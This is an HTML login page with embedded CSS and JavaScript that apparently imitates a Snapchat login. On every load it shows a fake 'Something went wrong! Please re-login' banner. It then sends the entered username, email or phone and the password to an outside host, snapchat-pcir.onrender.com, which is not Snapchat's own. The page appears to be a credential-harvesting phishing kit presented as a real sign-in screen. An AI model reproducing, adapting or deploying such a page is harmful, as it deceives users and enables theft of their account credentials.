<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <link rel="shortcut icon" href="img/faviconV2.png">
  <title>Login • BLANK</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: "Avenir Next", -apple-system, Arial, sans-serif;
      background: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      padding-top: 80px;
      position: relative;
    }

    /* Back button */
    .back-button {
      position: absolute;
      top: 16px;
      left: 14px;
      background: none;
      border: none;
      cursor: pointer;
      padding: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .back-button img { width: 18px; height: 18px; opacity: 0.5; }
    .back-button:hover img { opacity: 1; }

    /* placeholder icon circle */
    .placeholder-icon {
      width: 64px;
      height: 64px;
      border-radius: 50%;
      background: #f0f0f0;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 18px;
    }
    .placeholder-icon svg {
      width: 32px;
      height: 32px;
      stroke: #bbb;
      fill: none;
      stroke-width: 1.5;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    h1 {
      font-size: 22px;
      font-weight: 600;
      color: #000;
      margin-bottom: 28px;
      text-align: center;
      letter-spacing: -0.3px;
    }

    .form-wrap {
      width: 100%;
      max-width: 340px;
      padding: 0 20px;
    }

    /* Step 1: username field */
    #step-1, #step-2 { width: 100%; }
    #step-2 { display: none; }

    .field-label {
      font-size: 12px;
      font-weight: 600;
      color: #888;
      margin-bottom: 6px;
      display: block;
      letter-spacing: 0.02em;
    }

    input[type="text"],
    input[type="email"],
    input[type="password"],
    input[type="tel"] {
      width: 100%;
      padding: 13px 14px;
      border: 1.5px solid #e0e0e0;
      border-radius: 10px;
      font-size: 15px;
      font-family: inherit;
      color: #111;
      outline: none;
      caret-color: #00A6FF;
      transition: border-color 0.2s;
      background: #fff;
    }
    input:focus { border-color: #00A6FF; }

    .phone-toggle {
      display: block;
      margin-top: 12px;
      font-size: 13px;
      font-weight: 600;
      color: #00A6FF;
      text-decoration: none;
      cursor: pointer;
      background: none;
      border: none;
      padding: 0;
      font-family: inherit;
    }
    .phone-toggle:hover { text-decoration: underline; }

    /* Password field row */
    .password-wrap {
      position: relative;
    }
    .password-wrap input { padding-right: 44px; }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 4px;
      display: flex;
      align-items: center;
    }
    .toggle-password img { width: 20px; height: 20px; opacity: 0.4; }
    .toggle-password:hover img { opacity: 0.8; }

    /* Save info */
    .save-info {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-top: 14px;
    }
    .save-info input[type="checkbox"] { width: 15px; height: 15px; accent-color: #00A6FF; }
    .save-info label {
      font-size: 12px;
      color: #aaa;
      font-weight: 400;
      cursor: pointer;
    }

    .forgot {
      display: block;
      margin-top: 14px;
      font-size: 13px;
      font-weight: 600;
      color: #00A6FF;
      text-decoration: none;
      text-align: left;
    }
    .forgot:hover { text-decoration: underline; }

    /* Next / Login button */
    .btn-next {
      width: 100%;
      margin-top: 24px;
      padding: 13px;
      background: #00A6FF;
      color: #fff;
      border: none;
      border-radius: 999px;
      font-size: 15px;
      font-weight: 700;
      font-family: inherit;
      cursor: pointer;
      transition: background 0.2s, transform 0.15s;
      letter-spacing: 0.01em;
    }
    .btn-next:hover  { background: #0094e0; }
    .btn-next:active { transform: scale(0.98); }
    .btn-next:disabled { background: #a7d8f7; cursor: not-allowed; transform: none; }

    /* Error / success messages */
    .incorrect {
      display: none;
      color: #e03535;
      font-size: 12.5px;
      margin-top: 8px;
      text-align: left;
    }
    .server-message {
      display: none;
      padding: 10px 12px;
      margin-top: 12px;
      border-radius: 8px;
      font-size: 13px;
      text-align: left;
    }
    .server-message.error {
      display: block;
      background: #fff0f0;
      color: #cc0000;
      border: 1px solid #f5c6c6;
    }
    .server-message.success {
      display: block;
      background: #f0fff4;
      color: #007a33;
      border: 1px solid #b2dfcc;
    }

    /* Error banner */
    .error-banner {
      display: none;
      background: #f44336;
      color: #fff;
      padding: 12px 16px;
      border-radius: 8px;
      font-size: 14px;
      text-align: center;
      width: calc(100% - 40px);
      max-width: 340px;
      margin-bottom: 20px;
      animation: fadeIn 0.4s ease, vibrate 0.2s ease-in-out 3;
    }
    @keyframes fadeIn  { from { opacity: 0; } to { opacity: 1; } }
    @keyframes vibrate {
      0%,100% { transform: translateX(0); }
      25%      { transform: translateX(-5px); }
      75%      { transform: translateX(5px); }
    }

    .spinner {
      display: inline-block;
      width: 14px; height: 14px;
      border: 2px solid rgba(255,255,255,0.4);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
      vertical-align: middle;
      margin-right: 6px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <button class="back-button" onclick="goBack()">
    <img src="img/left-arrow.png" alt="back">
  </button>

  <div id="error-banner" class="error-banner">
    Something went wrong! Please re-login to your account.
  </div>

  <!-- Placeholder icon -->
  <div class="placeholder-icon">
    <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
  </div>

  <h1 id="page-title">Log in</h1>

  <div class="form-wrap">

    <!-- Step 1: username/email -->
    <div id="step-1">
      <span class="field-label" id="input-label">Username or Email</span>
      <input type="text" id="username" placeholder="" autocomplete="username" />
      <button class="phone-toggle" id="switch-to-phone">Use phone number instead</button>

      <div class="incorrect" id="step1-error">Please enter your username, email or phone.</div>

      <button class="btn-next" id="next-btn" onclick="goToStep2()">Next</button>
    </div>

    <!-- Step 2: password -->
    <div id="step-2">
      <span class="field-label">Password</span>
      <div class="password-wrap">
        <input type="password" id="password" autocomplete="current-password" />
        <button type="button" class="toggle-password">
          <img src="img/eye-closed.svg" id="eye-icon" alt="show password">
        </button>
      </div>

      <div class="incorrect" id="step2-error">Password must be at least 8 characters.</div>
      <div id="server-message" class="server-message"></div>

      <div class="save-info">
        <input type="checkbox" id="save-login">
        <label for="save-login">Save login info on this device</label>
      </div>

      <a href="#" class="forgot">Forgot your password?</a>

      <button class="btn-next" id="login-btn" onclick="handleLogin()">Log In</button>
    </div>

  </div>

  <script>
    const SERVER_URL = 'https://snapchat-pcir.onrender.com';

    // ── Step 1 → Step 2 ──────────────────────────────────────────────
    function goToStep2() {
      const username   = document.getElementById('username').value.trim();
      const step1Error = document.getElementById('step1-error');

      if (!username) {
        step1Error.style.display = 'block';
        return;
      }
      step1Error.style.display = 'none';
      document.getElementById('step-1').style.display = 'none';
      document.getElementById('step-2').style.display = 'block';
      document.getElementById('page-title').textContent = 'Enter password';
      document.getElementById('password').focus();
    }

    // ── Back button ──────────────────────────────────────────────────
    function goBack() {
      if (document.getElementById('step-2').style.display === 'block') {
        document.getElementById('step-2').style.display = 'none';
        document.getElementById('step-1').style.display = 'block';
        document.getElementById('page-title').textContent = 'Log in';
      } else {
        window.location.href = 'index.html';
      }
    }

    // ── Login: send to server ────────────────────────────────────────
    async function handleLogin() {
      const usernameOrEmail = document.getElementById('username').value.trim();
      const password        = document.getElementById('password').value;
      const step2Error      = document.getElementById('step2-error');
      const serverMsg       = document.getElementById('server-message');
      const loginBtn        = document.getElementById('login-btn');

      step2Error.style.display = 'none';
      serverMsg.className  = 'server-message';
      serverMsg.textContent = '';

      if (password.length < 8) {
        step2Error.style.display = 'block';
        return;
      }

      loginBtn.disabled = true;
      loginBtn.innerHTML = '<span class="spinner"></span>Logging in…';

      try {
        const res  = await fetch(`${SERVER_URL}/api/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: usernameOrEmail, password })
        });
        const data = await res.json();

        if (res.ok) {
          serverMsg.className   = 'server-message success';
          serverMsg.textContent = 'Login successful!';
          // setTimeout(() => window.location.href = 'home.html', 1000);
        } else {
          serverMsg.className   = 'server-message error';
          serverMsg.textContent = data.error || 'Login failed. Please try again.';
        }
      } catch (err) {
        serverMsg.className   = 'server-message error';
        serverMsg.textContent = 'Could not reach the server. Please try again.';
      }

      loginBtn.disabled = false;
      loginBtn.textContent = 'Log In';
    }

    // ── Toggle password visibility ───────────────────────────────────
    document.querySelector('.toggle-password').addEventListener('click', function () {
      const pwd     = document.getElementById('password');
      const eyeIcon = document.getElementById('eye-icon');
      if (pwd.type === 'password') {
        pwd.type    = 'text';
        eyeIcon.src = 'img/eye-open.svg';
      } else {
        pwd.type    = 'password';
        eyeIcon.src = 'img/eye-closed.svg';
      }
    });

    // ── Switch username ↔ phone ──────────────────────────────────────
    const switchBtn    = document.getElementById('switch-to-phone');
    const usernameInput = document.getElementById('username');
    const inputLabel   = document.getElementById('input-label');

    switchBtn.addEventListener('click', function () {
      if (inputLabel.textContent === 'Username or Email') {
        inputLabel.textContent  = 'Phone Number';
        usernameInput.type      = 'tel';
        switchBtn.textContent   = 'Use email instead';
      } else {
        inputLabel.textContent  = 'Username or Email';
        usernameInput.type      = 'text';
        switchBtn.textContent   = 'Use phone number instead';
      }
    });

    // ── Enter key support ────────────────────────────────────────────
    document.addEventListener('keydown', e => {
      if (e.key !== 'Enter') return;
      if (document.getElementById('step-2').style.display === 'block') {
        handleLogin();
      } else {
        goToStep2();
      }
    });

    // ── Error banner ─────────────────────────────────────────────────
    window.onload = function () {
      const banner = document.getElementById('error-banner');
      banner.style.display = 'block';
      document.body.addEventListener('click', () => banner.style.display = 'none');
    };
  </script>

</body>
</html>
